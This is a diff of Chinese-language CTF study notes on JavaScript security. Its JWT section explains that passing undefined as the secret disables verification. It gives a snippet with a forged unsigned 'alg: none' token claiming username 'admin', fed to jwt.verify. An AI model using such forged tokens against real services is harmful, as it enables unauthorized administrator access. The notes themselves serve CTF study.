@@ -16,17 +16,14 @@
 - # JWT
   id:: 62efd884-36bd-4729-a628-6c94b3f1b08b
 	- 不知道 secret，可以通过传入一个 undefined 来关闭验证功能。
-	  
-	  如下：
-	  
-	  ```javascript
-	  const evil_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY0NzMzNDY5OH0."
-	  const result = jwt.verify(
-	  evil_jwt,   // 不包含签名的自定义jwt
-	  undefined,  // secret
-	  "HS256"     //受害者指定的加密算法
-	  );
-	  ```
+		- ```javascript
+		  const evil_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY0NzMzNDY5OH0."
+		  const result = jwt.verify(
+		  evil_jwt,   // 不包含签名的自定义jwt
+		  undefined,  // secret
+		  "HS256"     //受害者指定的加密算法
+		  );
+		  ```
 - # 绕过
 	- [[CTF/JS/WAF绕过]]
 - # 注释
